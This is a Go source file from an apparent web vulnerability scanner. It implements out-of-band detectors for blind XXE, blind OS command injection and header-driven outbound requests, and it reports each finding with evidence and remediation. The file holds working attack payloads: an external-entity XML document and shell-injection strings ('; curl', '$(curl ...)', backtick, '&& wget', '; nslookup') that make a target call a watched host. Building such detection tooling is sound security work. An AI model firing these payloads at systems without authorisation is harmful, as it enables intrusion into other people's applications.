package active

// This file carries the out-of-band vectors that are not "a parameter whose value
// is fetched".
//
// `detect_out_of_band.go` settles the rows whose shape is one thing — a parameter
// value becomes an address the application reaches. The vectors below are the
// ones that reach an address through a different road, and each needed its own
// probe because each places the watched address in a different part of the
// request:
//
//   - **Blind XXE** puts it in a document, as an external entity's system
//     identifier. The parameter parses XML, and the parser fetches the entity.
//   - **Blind command execution** puts it in a command line, as the argument of a
//     fetch. The parameter is concatenated into a shell command, and the command
//     runs.
//   - **Request-header origin** puts it in a header. The parameter is not involved
//     at all: the application builds a URL from a header it was sent — the shape a
//     password-reset link, an absolute redirect and a referer log all have.
//
// # Why each waits for its own callback rather than sharing one wait
//
// A callback that arrives after probe A cannot be attributed to probe A unless
// nothing else was sent in between. Each probe therefore waits on its own, in the
// order they are fired, and the run's wait window is what bounds the whole thing.
// That costs wall time proportional to the number of probes, which is why the
// waits are short and why the window is a field rather than a constant: an
// operator whose target is slow can raise it without editing the code.
//
// # What a callback proves, and what it does not
//
// A callback proves the application **reached** the address. It does not prove
// what happened to the answer, and it does not prove the request was reachable by
// an attacker on its own — a blind injection may need a second condition to be
// exploitable. Each row says what it proves and stops there, because the
// consequence of a fetch is decided by what the fetched content does, and this run
// does not see that.

import (
	"context"
	"net/http"

	"strings"
)

// outOfBandXML is the out-of-band document reader.
//
// It is a separate type rather than a method on `OutOfBand` because it needs the
// listener and because its findings are about documents, not about parameters: the
// evidence is an entity the parser resolved, and the title names the parse, not a
// value.
type outOfBandXML struct {
	client *OASTClient
}

// Name implements Module.
func (outOfBandXML) Name() string { return "out-of-band-xml" }

// Level implements Module.
//
// Parameter level, because the document is a parameter's value: the probe has to
// put a document somewhere the application will parse as XML.
func (outOfBandXML) Level() Level { return LevelParam }

// xmlParameterNames are the parameters worth offering a document to.
//
// It is a short list on purpose. A document is a large payload and the wrong
// parameter is a large request for nothing, and the names below are the ones an
// application parses: uploads, imports, webhooks, and the generic `xml`/`data`
// names form libraries use. This is a cost decision about this detector, and the
// run's request count is where it is visible.
var xmlParameterNames = map[string]bool{
	"xml": true, "data": true, "payload": true, "body": true, "document": true,
	"import": true, "upload": true, "webhook": true, "request": true, "content": true,
	"soap": true, "sxml": true, "feed": true, "rss": true, "svg": true,
}

// oobXMLCanary is the entity name the probe declares. It is fixed, for the
// reason every canary here is fixed.
const oobXMLCanary = "rroastxml"

// Scan offers the application a document whose entity points at the watched
// address, and waits for the parser to fetch it.
func (x outOfBandXML) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	if x.client == nil || p.Param == "" || !xmlParameterNames[normalisedParamName(p.Param)] {
		return nil
	}
	if baseline == nil || baseline.StatusCode >= 400 || isPublicResource(p.URL) {
		return nil
	}
	address := x.client.PayloadURL()
	if strings.TrimSpace(address) == "" {
		return nil
	}
	document := `<?xml version="1.0"?>` +
		`<!DOCTYPE r [<!ENTITY ` + oobXMLCanary + ` SYSTEM "` + address + `/xxe">]>` +
		`<r>&` + oobXMLCanary + `;</r>`
	if _, err := t.Fire(ctx, p, p.Param, document, false, nil); err != nil {
		return nil
	}
	events, err := x.client.WaitFor(ctx, x.client.Wait)
	if err != nil || len(events) == 0 {
		return nil
	}
	finding, _ := NewFinding(Spec{
		Module:  "out-of-band-xml",
		Title:   "Blind XML External Entity (callback observed): 0x00100A00",
		Claimed: SeverityHigh,
		Tier:    TierVerified,
		Point:   p,
		Payload: document,
		Evidence: "the parser resolved an entity pointing at " + address +
			"\ncallback over " + firstNonBlank(events[0].Protocol, "http") +
			"\noast event: " + oastEventJSON(events[0]),
		Description: "The document submitted to `" + p.Param + "` declared an external entity " +
			"whose system identifier is an address this run is watching, and the address received " +
			"a connection. The XML parser therefore fetches a location the document chose — " +
			"which is the whole of an XXE read primitive, and the reason local files and internal " +
			"endpoints are reachable from here at all.\n\n" +
			"Not proven: what the answer was used for, or whether the response can be read back " +
			"out of band. This run observes that the fetch happened.",
		Remediation: "Disable external entity resolution in the parser, and reject a document " +
			"that declares a `SYSTEM` or `PUBLIC` identifier. Where the application must fetch a " +
			"reference, resolve it itself against an allow-list.",
	})
	return []Finding{finding}
}

// outOfBandCommand is the blind command-execution reader.
type outOfBandCommand struct {
	client *OASTClient
}

// Name implements Module.
func (outOfBandCommand) Name() string { return "out-of-band-cmd" }

// Level implements Module.
func (outOfBandCommand) Level() Level { return LevelParam }

// oobCommandCanary is the argument the probe asks the target to fetch.
const oobCommandCanary = "rroastcmd"

// oobCommandPayloads are the shapes a value takes when it is concatenated into a
// command line, one per shell the original's checks distinguish.
//
// They all ask for an HTTP fetch rather than a DNS lookup, and that is a
// deliberate choice about what this run can observe: a DNS lookup would have to be
// resolved by a real domain, so the proof would depend on the operator's DNS
// rather than on the callback channel the service already provides. A resolver is
// still covered — the service watches the same hostname — and the HTTP form is the
// one that works against every configuration.
func oobCommandPayloads(host string) []string {
	return []string{
		"; curl -s --max-time 5 http://" + host + "/" + oobCommandCanary,
		"| curl -s --max-time 5 http://" + host + "/" + oobCommandCanary,
		"&& wget -q -T 5 -O /dev/null http://" + host + "/" + oobCommandCanary,
		"$(curl -s --max-time 5 http://" + host + "/" + oobCommandCanary + ")",
		"`curl -s --max-time 5 http://" + host + "/" + oobCommandCanary + "`",
		"; nslookup " + host,
	}
}

// Scan asks the target to reach the watched address from a command line, and waits
// for the callback.
func (c outOfBandCommand) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	if c.client == nil || p.Param == "" {
		return nil
	}
	if baseline == nil || baseline.StatusCode >= 400 || isPublicResource(p.URL) {
		return nil
	}
	host := c.client.Domain()
	if strings.TrimSpace(host) == "" {
		return nil
	}
	for _, payload := range oobCommandPayloads(host) {
		if ctx.Err() != nil {
			return nil
		}
		if _, err := t.Fire(ctx, p, p.Param, payload, false, nil); err != nil {
			continue
		}
		events, err := c.client.WaitFor(ctx, c.client.Wait)
		if err != nil || len(events) == 0 {
			continue
		}
		finding, _ := NewFinding(Spec{
			Module:  "out-of-band-cmd",
			Title:   "Blind OS Command Execution (callback observed): 0x00300210",
			Claimed: SeverityCritical,
			Tier:    TierVerified,
			Point:   p,
			Payload: payload,
			Evidence: "the command line ran a fetch of " + host +
				"\ncallback over " + firstNonBlank(events[0].Protocol, "http") +
				"\noast event: " + oastEventJSON(events[0]),
			Description: "A value submitted to `" + p.Param + "` reached a command line, and the " +
				"command that ran fetched " + host + " — an address this run named. The target " +
				"therefore executed a command built from a client's value, which is command " +
				"execution, and the callback is the evidence that distinguishes it from a " +
				"parameter that merely looked like a command.\n\n" +
				"Not proven: what else that command line could do. This run proves the value " +
				"reached a shell.",
			Remediation: "Do not build a command line from request data. Call the program with " +
				"an argument vector and no shell, and validate anything the program will act on.",
		})
		return []Finding{finding}
	}
	return nil
}

// outOfBandHeader is the header-borne reader.
type outOfBandHeader struct {
	client *OASTClient
}

// Name implements Module.
func (outOfBandHeader) Name() string { return "out-of-band-header" }

// Level implements Module.
//
// Endpoint level, and the difference from the other two is the whole point: the
// value this row is about is not a parameter at all. It is a request **header**,
// and the application's use of it — to build a reset link, an absolute redirect,
// a referer for a fetch, a host for a lookup — is what reaches the watched
// address. So this is the only one of the four that runs on every endpoint.
func (outOfBandHeader) Level() Level { return LevelEndpoint }

// oobHeaderCanary is the path the header-borne address carries, so the callback is
// attributable to this row rather than to a parameter probe.
const oobHeaderCanary = "hdr"

// headerProbes are the headers a URL is routinely built from.
//
// `Host` is included because it is the one a vhost or an absolute link is built
// from most often, and `Referer` because an outbound fetch or an analytics beacon
// is built from it on essentially every page that has one.
func headerProbes(address string) map[string]string {
	host := strings.TrimPrefix(strings.TrimPrefix(address, "http://"), "https://")
	if index := strings.IndexByte(host, '/'); index >= 0 {
		host = host[:index]
	}
	return map[string]string{
		"Referer":         address + "/" + oobHeaderCanary,
		"X-Forwarded-For": host,
		"X-Original-Host": host,
		"Forwarded":       "for=" + host,
		"From":            oobCommandCanary + "@" + host,
		"Client-IP":       host,
	}
}

// Scan offers the watched address in the headers an application turns into a URL,
// and waits for the callback.
func (h outOfBandHeader) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	if h.client == nil {
		return nil
	}
	if baseline == nil || baseline.StatusCode >= 400 || isPublicResource(p.URL) {
		return nil
	}
	address := h.client.PayloadURL()
	if strings.TrimSpace(address) == "" {
		return nil
	}
	for _, name := range []string{"Referer", "X-Forwarded-For", "X-Original-Host",
		"Forwarded", "From", "Client-IP"} {
		if ctx.Err() != nil {
			return nil
		}
		headers := http.Header{}
		headers.Set(name, headerProbes(address)[name])
		if _, err := t.Fire(ctx, p, "", "", false, headers); err != nil {
			continue
		}
		events, err := h.client.WaitFor(ctx, h.client.Wait)
		if err != nil || len(events) == 0 {
			continue
		}
		finding, _ := NewFinding(Spec{
			Module:  "out-of-band-header",
			Title:   "Request Header Used to Reach an Operator-Named Address (callback observed): 0x00300200",
			Claimed: SeverityHigh,
			Tier:    TierVerified,
			Point:   p,
			Payload: name + ": " + headerProbes(address)[name],
			Evidence: "the endpoint was sent " + name + " carrying " + headerProbes(address)[name] +
				"\nand the address received a connection" +
				"\noast event: " + oastEventJSON(events[0]),
			Description: "The endpoint received a `" + name + "` header carrying an address this run " +
				"named, and that address was then contacted. The application therefore built a " +
				"URL, a host or an outbound request out of a header a client controls — which is " +
				"how a password-reset link, an absolute redirect or a referer beacon becomes a " +
				"request to somewhere the client chose.\n\n" +
				"Not proven: whether the fetched content is returned to the client. This run " +
				"observes that the address was reached.",
			Remediation: "Build outbound addresses from configuration, not from request headers. " +
				"Where a header legitimately identifies a client, keep it out of every URL the " +
				"application constructs.",
		})
		return []Finding{finding}
	}
	return nil
}
